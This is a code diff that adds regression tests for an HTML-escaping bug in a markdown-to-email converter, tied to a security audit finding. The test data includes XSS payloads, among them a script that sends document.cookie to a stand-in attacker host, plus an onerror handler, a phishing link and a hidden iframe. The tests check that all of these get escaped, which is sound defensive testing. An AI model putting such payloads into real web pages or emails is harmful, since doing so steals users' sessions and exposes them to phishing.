@@ -37,4 +37,51 @@ describe("markdownToHtml", () => {
     const html = markdownToHtml("a\n\n---\n\n---\n\nb");
     expect(html.match(/border-top:2px solid #ddd/g)?.length).toBe(1);
   });
+
+  // Security audit run-3, F5. The old implementation escaped everything *except*
+  // substrings matching `<[^>]+>`, which it could not distinguish from tags it
+  // had generated itself — so raw markup in the source prose reached the
+  // outgoing email verbatim. Prose is never allowed to carry markup.
+  describe("does not pass raw HTML from the source through (F5)", () => {
+    const payloads = [
+      '<script>fetch("https://evil.example?c="+document.cookie)</script>',
+      "Hello <img src=x onerror=alert(1)> world",
+      'Click <a href="https://evil.example/phish">your invoice</a> now',
+      "<style>*{display:none}</style>hidden",
+      "<iframe src=https://evil.example></iframe>",
+    ];
+
+    for (const payload of payloads) {
+      it(`escapes ${payload.slice(0, 32)}`, () => {
+        const html = markdownToHtml(payload);
+        // The only tags in the output are the ones this module emits.
+        expect(html).not.toContain("<script");
+        expect(html).not.toContain("<style");
+        expect(html).not.toContain("<iframe");
+        expect(html).not.toContain("<img src=x");
+        expect(html).not.toContain('<a href="https://evil.example/phish"');
+        expect(html).toContain("&lt;");
+      });
+    }
+
+    it("still renders legitimate markdown, escaped exactly once", () => {
+      const html = markdownToHtml("see [docs](https://example.com/a?b=1&c=2) and **bold**");
+      expect(html).toContain('<a href="https://example.com/a?b=1&amp;c=2">docs</a>');
+      expect(html).not.toContain("&amp;amp;");
+      expect(html).toContain("font-weight:600");
+    });
+
+    it("escapes bare ampersands and angle brackets in prose", () => {
+      const html = markdownToHtml("Tom & Jerry < 5 > 3");
+      expect(html).toContain("Tom &amp; Jerry &lt; 5 &gt; 3");
+    });
+
+    it("cannot be tricked by a forged placeholder sentinel", () => {
+      // U+E000 is the internal token delimiter; source text carrying it must not
+      // be able to address a generated-HTML slot.
+      const html = markdownToHtml("\uE000" + "0" + "\uE000" + " and [ok](https://example.com)");
+      expect(html).toContain('<a href="https://example.com">ok</a>');
+      expect(html).not.toContain("\uE000");
+    });
+  });
 });
